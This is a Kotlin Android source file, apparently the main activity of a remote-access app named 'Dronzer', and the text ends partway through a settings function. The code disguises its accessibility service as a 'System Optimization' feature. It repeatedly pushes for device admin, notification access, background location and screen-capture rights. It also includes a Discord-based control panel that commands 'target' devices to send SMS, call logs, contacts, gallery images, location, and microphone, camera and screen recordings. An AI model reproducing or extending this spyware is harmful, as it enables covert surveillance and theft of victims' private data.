package com.example.dronzer

import android.Manifest
import android.annotation.SuppressLint
import android.app.AppOpsManager
import android.app.DownloadManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.media.MediaPlayer
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.ViewGroup
import android.widget.Toast
import android.widget.VideoView
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.core.*
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.combinedClickable
import androidx.compose.foundation.gestures.detectTransformGestures
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.automirrored.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.drawscope.rotate
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.core.content.ContextCompat
import androidx.core.net.toUri
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.fragment.app.FragmentActivity
import coil.compose.AsyncImage
import com.example.dronzer.ui.AuthenticationScreen
import com.example.dronzer.ui.CMatrixBackground
import com.example.dronzer.ui.theme.DronzerTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.*
import kotlin.math.*

enum class Screen {
    STATUS, DEVICES, CALL_LOGS, MESSAGES, CONTACTS, AUDIO, CAMERA, SCREEN_RECO, LOCATION, GALLERY
}

data class DiscordFile(val name: String, val url: String, val size: Int, val deviceId: String?)

class MainActivity : FragmentActivity() {

    private val isSystemActive = mutableStateOf(false)

    private val runtimePermissions = mutableListOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALENDAR,
        Manifest.permission.WRITE_CALENDAR,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.BODY_SENSORS,
        Manifest.permission.VIBRATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            add(Manifest.permission.BLUETOOTH_SCAN)
            add(Manifest.permission.BLUETOOTH_CONNECT)
            add(Manifest.permission.BLUETOOTH_ADVERTISE)
        }
    }.toTypedArray()

    private val requestPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        checkAllPermissionsAggressively()
    }

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ ->
        checkAllPermissionsAggressively()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            Log.d("DronzerMain", "Screen capture permission granted.")
            LiveScreenStreamer.setProjectionData(result.resultCode, result.data!!)
            startMonitoringService()
            checkAllPermissionsAggressively()
        } else {
            hasRequestedScreenCaptureThisSession = false
            checkAllPermissionsAggressively()
        }
    }

    private var hasRequestedScreenCaptureThisSession = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            var showIntro by rememberSaveable { mutableStateOf(true) }
            val systemActiveState = rememberSaveable { isSystemActive }
            
            DronzerTheme {
                if (showIntro) {
                    IntroVideoScreen(onVideoFinished = { showIntro = false })
                } else {
                    if (systemActiveState.value) {
                        Dashboard()
                    } else {
                        Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                            MainScreen(modifier = Modifier.padding(innerPadding))
                        }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        checkAllPermissionsAggressively()
    }

    private fun checkAllPermissionsAggressively() {
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Enable 'Dronzer System Optimization' to proceed.", Toast.LENGTH_LONG).show()
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            return
        }

        val missingRuntime = runtimePermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingRuntime.isNotEmpty()) {
            requestPermissionsLauncher.launch(missingRuntime.toTypedArray())
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                return
            }
        }

        checkSpecialPermissions()
    }

    private fun checkSpecialPermissions() {
        if (!isDeviceAdminActive()) {
            requestDeviceAdmin()
            return
        }

        if (!isNotificationServiceEnabled()) {
            Toast.makeText(this, "Enable Notification Access", Toast.LENGTH_LONG).show()
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            return
        }

        if (!isBatteryOptimizationIgnored()) {
            requestBatteryOptimization()
            return
        }

        if (!isAutostartAllowed()) {
            requestAutostartPermission()
            return
        }

        startMonitoringService()

        if (!hasRequestedScreenCaptureThisSession) {
            hasRequestedScreenCaptureThisSession = true
            Handler(Looper.getMainLooper()).postDelayed({
                requestScreenCapturePermission()
            }, 2000)
            return 
        }

        isSystemActive.value = true
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponentName = ComponentName(this, DronzerAccessibilityService::class.java)
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        while (colonSplitter.hasNext()) {
            val componentNameString = colonSplitter.next()
            val enabledService = ComponentName.unflattenFromString(componentNameString)
            if (enabledService != null && enabledService == expectedComponentName) return true
        }
        return false
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, DronzerAdminReceiver::class.java)
        return dpm.isAdminActive(adminComponent)
    }

    private fun requestDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        val adminComponent = ComponentName(this, DronzerAdminReceiver::class.java)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Dronzer System Admin is required for remote wipe and security features.")
        startActivity(intent)
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val cn = ComponentName(this, NotificationMonitor::class.java)
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(cn.flattenToString())
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    @SuppressLint("BatteryLife")
    private fun requestBatteryOptimization() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = "package:$packageName".toUri()
            }
            startActivity(intent)
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        }
    }

    private fun isAutostartAllowed(): Boolean {
        val prefs = getSharedPreferences("dronzer_prefs", MODE_PRIVATE)
        if (Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true)) {
            try {
                val ops = getSystemService(APP_OPS_SERVICE) as AppOpsManager
                val method = ops.javaClass.getMethod("checkOpNoThrow", Int::class.javaPrimitiveType, Int::class.javaPrimitiveType, String::class.java)
                val result = method.invoke(ops, 10008, android.os.Process.myUid(), packageName) as Int
                if (result == AppOpsManager.MODE_ALLOWED) return true
            } catch (e: Exception) {}
        }
        return prefs.getBoolean("autostart_handled", false)
    }

    private fun requestAutostartPermission() {
        val prefs = getSharedPreferences("dronzer_prefs", MODE_PRIVATE)
        prefs.edit().putBoolean("autostart_handled", true).apply()

        val manufacturer = Build.MANUFACTURER.lowercase()
        val intent = Intent()
        
        try {
            when {
                manufacturer.contains("xiaomi") -> {
                    intent.component = ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
                }
                manufacturer.contains("samsung") -> {
                    intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                    intent.data = "package:$packageName".toUri()
                }
                manufacturer.contains("oneplus") -> {
                    intent.component = ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")
                }
                manufacturer.contains("oppo") || manufacturer.contains("realme") -> {
                    intent.component = ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
                    if (packageManager.resolveActivity(intent, 0) == null) {
                        intent.component = ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")
                    }
                }
                manufacturer.contains("vivo") -> {
                    intent.component = ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
                    if (packageManager.resolveActivity(intent, 0) == null) {
                        intent.component = ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")
                    }
                }
                manufacturer.contains("huawei") -> {
                    intent.component = ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
                }
                else -> {
                    intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                    intent.data = Uri.fromParts("package", packageName, null)
                }
            }
            startActivity(intent)
        } catch (e: Exception) {
            val detailsIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", packageName, null)
            }
            startActivity(detailsIntent)
        }
    }

    private fun requestScreenCapturePermission() {
        try {
            val mpManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            screenCaptureLauncher.launch(mpManager.createScreenCaptureIntent())
        } catch (e: Exception) {
            Log.e("DronzerMain", "Failed to launch screen capture: ${e.message}")
        }
    }

    private fun startMonitoringService() {
        val intent = Intent(this, DronzerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}

@Composable
fun MainScreen(modifier: Modifier = Modifier) {
    Column(
        modifier = modifier.fillMaxSize().padding(16.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Image(
            painter = painterResource(id = R.drawable.ic_logo),
            contentDescription = "App Logo",
            modifier = Modifier.size(120.dp)
        )
        Spacer(modifier = Modifier.height(24.dp))
        Text(text = "Dronzer System Active")
        Spacer(modifier = Modifier.height(16.dp))
        Text(text = "Status: Authorizing Background Protocols....")
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun Dashboard() {
    val context = LocalContext.current
    val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)
    val scope = rememberCoroutineScope()
    var selectedScreen by rememberSaveable { mutableStateOf(Screen.STATUS) }
    
    val prefs = remember { context.getSharedPreferences("dronzer_config", Context.MODE_PRIVATE) }
    val botToken by remember { mutableStateOf(prefs.getString("bot_token", "") ?: "") }
    val userToken by remember { mutableStateOf(prefs.getString("user_token", "") ?: "") }
    val channelId by remember { mutableStateOf(prefs.getString("channel_id", "") ?: "") }

    // New Settings State
    val matrixColorHex by remember { mutableStateOf(prefs.getString("matrix_color", "#00FF41") ?: "#00FF41") }

    var remoteData by remember { mutableStateOf("") }
    var remoteFiles by remember { mutableStateOf<List<DiscordFile>>(emptyList()) }
    var isLoading by remember { mutableStateOf(false) }
    var refreshTrigger by remember { mutableIntStateOf(0) }

    var isAudioRecording by rememberSaveable { mutableStateOf(false) }
    var isCameraRecording by rememberSaveable { mutableStateOf(false) }
    var isScreenRecording by rememberSaveable { mutableStateOf(false) }

    var playingFileUrl by rememberSaveable { mutableStateOf<String?>(null) }
    var playingFileName by rememberSaveable { mutableStateOf<String?>(null) }
    var isFullscreen by rememberSaveable { mutableStateOf(false) }
    
    var viewingImageUrl by rememberSaveable { mutableStateOf<String?>(null) }
    var viewingImageName by rememberSaveable { mutableStateOf<String?>(null) }
    
    var showSettings by remember { mutableStateOf(false) }
    
    var isAuthenticated by rememberSaveable { mutableStateOf(false) }

    if (!isAuthenticated) {
        AuthenticationScreen(onLoginSuccess = { isAuthenticated = true })
    } else {
        val snackbarHostState = remember { SnackbarHostState() }
        
        var selectedDeviceId by rememberSaveable { mutableStateOf<String?>(null) }

        fun sendRemoteCommand(command: String) {
            if (userToken.isEmpty() || channelId.isEmpty()) {
                scope.launch { snackbarHostState.showSnackbar("Please configure Discord Settings (User Token & Channel ID).") }
                return
            }
            scope.launch {
                try {
                    val client = OkHttpClient()
                    val json = JSONObject().put("content", "!$command")
                    val mediaType = "application/json; charset=utf-8".toMediaType()
                    val body = json.toString().toRequestBody(mediaType)
                    val request = Request.Builder()
                        .url("https://discord.com/api/v10/channels/$channelId/messages")
                        .post(body)
                        .addHeader("Authorization", userToken)
                        .build()
                    
                    withContext(Dispatchers.IO) {
                        client.newCall(request).execute().use { response ->
                            if (response.isSuccessful) {
                                scope.launch { snackbarHostState.showSnackbar("Command sent: !$command. Waiting for device...") }
                            } else {
                                val err = response.code
                                scope.launch { snackbarHostState.showSnackbar("Failed to send command: $err") }
                            }
                        }
                    }
                } catch (e: Exception) {
                    val msg = e.message ?: "Unknown error"
                    scope.launch { snackbarHostState.showSnackbar("Error: $msg") }
                }
            }
        }

        LaunchedEffect(Unit) {
            while (true) {
                delay(3000)
                refreshTrigger++
            }
        }

        LaunchedEffect(selectedScreen, refreshTrigger, botToken, channelId, selectedDeviceId) {
            if (selectedScreen == Screen.STATUS) {
                remoteData = ""
                return@LaunchedEffect
            }
            if (botToken.isEmpty() || channelId.isEmpty()) return@LaunchedEffect

            isLoading = true
            withContext(Dispatchers.IO) {
                try {
                    val client = OkHttpClient()
                    val request = Request.Builder()
                        .url("https://discord.com/api/v10/channels/$channelId/messages?limit=100")
                        .addHeader("Authorization", "Bot $botToken")
                        .build()

                    client.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            val body = response.body?.string() ?: ""
                            val messages = JSONArray(body)
                            val filesList = mutableListOf<DiscordFile>()
                            var foundText = ""
                            val deviceMap = mutableMapOf<String, String>()

                            for (i in 0 until messages.length()) {
                                val msg = messages.getJSONObject(i)
                                val attachments = msg.getJSONArray("attachments")
                                val content = msg.getString("content")
                                
                                val msgDeviceId = content.substringAfter("[ID:", "").substringBefore("]", "")

                                if (selectedScreen == Screen.DEVICES && isContentStructured(content, Screen.DEVICES)) {
                                    val cleanContent = content.stripAnsi()
                                    val id = cleanContent.lines().find { it.contains("**ID:**") }?.substringAfter("`")?.substringBefore("`") ?: ""
                                    if (id.isNotEmpty() && !deviceMap.containsKey(id)) {
                                        deviceMap[id] = content
                                    }
                                }

                                if (foundText.isEmpty() && (selectedDeviceId == null || msgDeviceId == selectedDeviceId)) {
                                    for (j in 0 until attachments.length()) {
                                        val att = attachments.getJSONObject(j)
                                        val name = att.getString("filename")
                                        val url = att.getString("url")
                                        if (name.endsWith(".txt") && isRelevant(name, selectedScreen)) {
                                            val contentReq = Request.Builder().url(url).build()
                                            client.newCall(contentReq).execute().use { res ->
                                                foundText = res.body?.string() ?: ""
                                            }
                                            break
                                        }
                                    }
                                    if (foundText.isEmpty() && isContentStructured(content, selectedScreen)) {
                                        foundText = content
                                    }
                                }
                                
                                for (j in 0 until attachments.length()) {
                                    val att = attachments.getJSONObject(j)
                                    filesList.add(DiscordFile(att.getString("filename"), att.getString("url"), att.getInt("size"), msgDeviceId.ifEmpty { null }))
                                }
                            }

                            remoteData = if (selectedScreen == Screen.DEVICES) {
                                deviceMap.values.joinToString("\n")
                            } else {
                                foundText
                            }
                            remoteFiles = if (selectedDeviceId != null) {
                                filesList.filter { it.deviceId == null || it.deviceId == selectedDeviceId }
                            } else {
                                filesList
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e("Dashboard", "Error fetching Discord data: ${e.message}")
                } finally {
                    isLoading = false
                }
            }
        }

        if (showSettings) {
            FullscreenSettingsPage(
                onClose = { showSettings = false },
                onSave = { 
                    val reloadIntent = Intent(context, DronzerService::class.java).apply {
                        action = DronzerService.ACTION_RELOAD_CONFIG
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(reloadIntent)
                    } else {
                        context.startService(reloadIntent)
                    }
                    scope.launch { snackbarHostState.showSnackbar("Settings synced with protocols.") }
                }
            )
        } else if (isFullscreen && playingFileUrl != null) {
            AdvancedVideoPlayer(
                fileUrl = playingFileUrl!!,
                fileName = playingFileName ?: "",
                isFullscreen = true,
                onToggleFullscreen = { isFullscreen = false },
                onBack = { 
                    isFullscreen = false
                    playingFileUrl = null
                    playingFileName = null
                }
            )
        } else {
            ModalNavigationDrawer(
                drawerState = drawerState,
                drawerContent = {
                    ModalDrawerSheet {
                        Column(modifier = Modifier.fillMaxHeight()) {
                            Text("Dronzer Panel", modifier = Modifier.padding(16.dp), style = MaterialTheme.typography.titleLarge)
                            HorizontalDivider()
                            Box(modifier = Modifier.weight(1f)) {
                                LazyColumn {
                                    item { NavigationDrawerItem(label = { Text("Status") }, icon = { Icon(Icons.Default.Info, null) }, selected = selectedScreen == Screen.STATUS, onClick = { selectedScreen = Screen.STATUS; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Devices") }, icon = { Icon(Icons.Default.Devices, null) }, selected = selectedScreen == Screen.DEVICES, onClick = { selectedScreen = Screen.DEVICES; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Call Logs") }, icon = { Icon(Icons.Default.Call, null) }, selected = selectedScreen == Screen.CALL_LOGS, onClick = { selectedScreen = Screen.CALL_LOGS; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Messages") }, icon = { Icon(Icons.Default.Email, null) }, selected = selectedScreen == Screen.MESSAGES, onClick = { selectedScreen = Screen.MESSAGES; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Contacts") }, icon = { Icon(Icons.Default.Person, null) }, selected = selectedScreen == Screen.CONTACTS, onClick = { selectedScreen = Screen.CONTACTS; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Audio Recorder") }, icon = { Icon(Icons.Default.Mic, null) }, selected = selectedScreen == Screen.AUDIO, onClick = { selectedScreen = Screen.AUDIO; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Camera Recorder") }, icon = { Icon(Icons.Default.Videocam, null) }, selected = selectedScreen == Screen.CAMERA, onClick = { selectedScreen = Screen.CAMERA; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Screen Recorder") }, icon = { Icon(Icons.AutoMirrored.Filled.ScreenShare, null) }, selected = selectedScreen == Screen.SCREEN_RECO, onClick = { selectedScreen = Screen.SCREEN_RECO; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Location") }, icon = { Icon(Icons.Default.LocationOn, null) }, selected = selectedScreen == Screen.LOCATION, onClick = { selectedScreen = Screen.LOCATION; scope.launch { drawerState.close() } }) }
                                    item { NavigationDrawerItem(label = { Text("Gallery") }, icon = { Icon(Icons.Default.PhotoLibrary, null) }, selected = selectedScreen == Screen.GALLERY, onClick = { selectedScreen = Screen.GALLERY; scope.launch { drawerState.close() } }) }
                                    item { 
                                        NavigationDrawerItem(
                                            label = { Text("Clear Caches") }, 
                                            icon = { Icon(Icons.Default.DeleteSweep, null) }, 
                                            selected = false, 
                                            onClick = { 
                                                sendRemoteCommand("clc")
                                                scope.launch { drawerState.close() } 
                                            }
                                        ) 
                                    }
                                }
                            }
                            HorizontalDivider()
                            NavigationDrawerItem(
                                label = { Text("Settings") },
                                icon = { Icon(Icons.Default.Settings, null) },
                                selected = false,
                                onClick = { showSettings = true; scope.launch { drawerState.close() } },
                                modifier = Modifier.padding(8.dp)
                            )
                        }
                    }
                }
            ) {
                Scaffold(
                    snackbarHost = { SnackbarHost(snackbarHostState) },
                    topBar = {
                        CenterAlignedTopAppBar(
                            title = { 
                                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                    Text(selectedScreen.name.replace("_", " ")) 
                                    if (selectedDeviceId != null) {
                                        Text("Target: $selectedDeviceId", fontSize = 10.sp, color = MaterialTheme.colorScheme.primary)
                                    }
                                }
                            },
                            navigationIcon = {
                                IconButton(onClick = { scope.launch { drawerState.open() } }) {
                                    Icon(Icons.Default.Menu, "Menu")
                                }
                            },
                            actions = {
                                if (isLoading) {
                                    CircularProgressIndicator(modifier = Modifier.size(24.dp), strokeWidth = 2.dp)
                                } else {
                                    IconButton(onClick = { refreshTrigger++ }) {
                                        Icon(Icons.Default.Refresh, null)
                                    }
                                }
                            }
                        )
                    },
                    floatingActionButton = {
                        if (selectedScreen != Screen.STATUS) {
                            Row(
                                modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.Bottom
                            ) {
                                val stopCmd = when(selectedScreen) {
                                    Screen.AUDIO -> "stop4"
                                    Screen.CAMERA -> "stop1"
                                    Screen.SCREEN_RECO -> "stop2"
                                    else -> ""
                                }
                                
                                if (stopCmd.isNotEmpty()) {
                                    FloatingActionButton(
                                        onClick = { 
                                            sendRemoteCommand(stopCmd)
                                            if (selectedScreen == Screen.AUDIO) isAudioRecording = false
                                            if (selectedScreen == Screen.CAMERA) isCameraRecording = false
                                            if (selectedScreen == Screen.SCREEN_RECO) isScreenRecording = false
                                        },
                                        containerColor = MaterialTheme.colorScheme.errorContainer,
                                        contentColor = MaterialTheme.colorScheme.error
                                    ) {
                                        Icon(Icons.Default.Stop, contentDescription = "Stop Recording")
                                    }
                                } else if (selectedScreen == Screen.DEVICES) {
                                    FloatingActionButton(
                                        onClick = { 
                                            sendRemoteCommand("all")
                                            selectedDeviceId = null
                                            scope.launch { snackbarHostState.showSnackbar("Broadcasting to ALL devices...") }
                                        },
                                        containerColor = MaterialTheme.colorScheme.tertiaryContainer
                                    ) {
                                        Icon(Icons.Default.Public, contentDescription = "Select All")
                                    }
                                } else {
                                    Spacer(modifier = Modifier.size(56.dp))
                                }

                                val isCurrentlyRecording = when(selectedScreen) {
                                    Screen.AUDIO -> isAudioRecording
                                    Screen.CAMERA -> isCameraRecording
                                    Screen.SCREEN_RECO -> isScreenRecording
                                    else -> false
                                }

                                FloatingActionButton(
                                    onClick = { 
                                        if (!isCurrentlyRecording) {
                                            val cmd = when(selectedScreen) {
                                                Screen.DEVICES -> "devices"
                                                Screen.CALL_LOGS -> "calllogs"
                                                Screen.MESSAGES -> "sms"
                                                Screen.CONTACTS -> "contacts"
                                                Screen.LOCATION -> "location"
                                                Screen.GALLERY -> "gallery"
                                                Screen.AUDIO -> "audio"
                                                Screen.CAMERA -> "scam"
                                                Screen.SCREEN_RECO -> "ssc"
                                                else -> ""
                                            }
                                            if (cmd.isNotEmpty()) {
                                                sendRemoteCommand(cmd)
                                                if (selectedScreen == Screen.AUDIO) isAudioRecording = true
                                                if (selectedScreen == Screen.CAMERA) isCameraRecording = true
                                                if (selectedScreen == Screen.SCREEN_RECO) isScreenRecording = true
                                            }
                                        }
                                    },
                                    containerColor = if (isCurrentlyRecording) Color.Gray else MaterialTheme.colorScheme.primaryContainer,
                                    contentColor = if (isCurrentlyRecording) Color.LightGray else MaterialTheme.colorScheme.primary
                                ) {
                                    Icon(if (isCurrentlyRecording) Icons.Default.RadioButtonChecked else Icons.Default.Send, contentDescription = "Send Command")
                                }
                            }
                        }
                    },
                    floatingActionButtonPosition = FabPosition.Center
                ) { padding ->
                    Surface(modifier = Modifier.padding(padding).fillMaxSize()) {
                        if (playingFileUrl != null) {
                            if (playingFileName?.endsWith(".amr") == true) {
                                AdvancedAudioPlayer(fileUrl = playingFileUrl!!, fileName = playingFileName!!) {
                                    playingFileUrl = null
                                    playingFileName = null
                                }
                            } else {
                                AdvancedVideoPlayer(
                                    fileUrl = playingFileUrl!!,
                                    fileName = playingFileName!!,
                                    isFullscreen = false,
                                    onToggleFullscreen = { isFullscreen = true },
                                    onBack = { 
                                        playingFileUrl = null
                                        playingFileName = null
                                    }
                                )
                            }
                        } else if (viewingImageUrl != null) {
                            AdvancedImageViewer(
                                url = viewingImageUrl!!,
                                name = viewingImageName!!,
                                onBack = { viewingImageUrl = null; viewingImageName = null }
                            )
                        } else {
                            when (selectedScreen) {
                                Screen.STATUS -> StatusContent(
                                    onClearCaches = { sendRemoteCommand("clc") },
                                    matrixColor = try { Color(android.graphics.Color.parseColor(matrixColorHex)) } catch(e: Exception) { Color(0xFF00FF41) }
                                )
                                Screen.DEVICES -> DevicesContent(
                                    data = remoteData, 
                                    selectedId = selectedDeviceId,
                                    onDeviceSelect = { id -> 
                                        val cmd = if (selectedDeviceId == null) "select $id" else "switch $id"
                                        selectedDeviceId = id
                                        sendRemoteCommand(cmd) 
                                    }
                                )
                                Screen.AUDIO -> RemoteFilesContent(remoteFiles, ".amr") { url, name -> playingFileUrl = url; playingFileName = name }
                                Screen.CAMERA -> RemoteFilesContent(remoteFiles, ".mp4", "cam") { url, name -> playingFileUrl = url; playingFileName = name }
                                Screen.SCREEN_RECO -> RemoteFilesContent(remoteFiles, ".mp4", "screen") { url, name -> playingFileUrl = url; playingFileName = name }
                                Screen.LOCATION -> RemoteLocationContent(remoteData)
                                Screen.MESSAGES -> RemoteMessagesContent(remoteData)
                                Screen.GALLERY -> RemoteGalleryContent(
                                    files = remoteFiles, 
                                    data = remoteData, 
                                    onFetchImage = { path -> sendRemoteCommand("getimg $path") },
                                    onViewImage = { url, name -> viewingImageUrl = url; viewingImageName = name }
                                )
                                else -> RemoteTextContent(remoteData, selectedScreen)
                            }
                        }
                    }
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
    val context = LocalContext.current
    val prefs = remember { context.getSharedPreferences("dronzer_config", Context.MODE_PRIVATE) }
    
    var botToken by remember { mutableStateOf(prefs.getString("bot_token", "") ?: "") }
    var userToken by remember { mutableStateOf(prefs.getString("user_token", "") ?: "") }
    var webhookUrl by remember { mutableStateOf(prefs.getString("webhook_url", "") ?: "") }
    var channelId by remember { mutableStateOf(prefs.getString("channel_id", "") ?: "") }
    var firebaseRealtimeUrl by remember { mutableStateOf(prefs.getString("firebase_url", "") ?: "") }
    
    var username by remember { mutableStateOf(prefs.getString("auth_user", "admin") ?: "admin") }
    var password by remember { mutableStateOf(prefs.getString("auth_pass", "admin") ?: "admin") }
    var is2faEnabled by remember { mutableStateOf(prefs.getBoolean("auth_2fa", false)) }
    
    var matrixColor by remember { mutableStateOf(prefs.getString("matrix_color", "#00FF41") ?: "#00FF41") }

    var activeDialog by remember { mutableStateOf<String?>(null) }

    Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
        Column {
            TopAppBar(
                title = { Text("Settings") },
                navigationIcon = {
                    IconButton(onClick = onClose) {
                        Icon(Icons.Default.Close, "Close")
                    }
                },
                actions = {
                    TextButton(onClick = {
                        prefs.edit().apply {
                            putString("bot_token", botToken.trim())
                            putString("user_token", userToken.trim())
                            putString("webhook_url", webhookUrl.trim())
                            putString("channel_id", channelId.trim())
                            putString("firebase_url", firebaseRealtimeUrl.trim())
                            putString("auth_user", username.trim())
                            putString("auth_pass", password.trim())
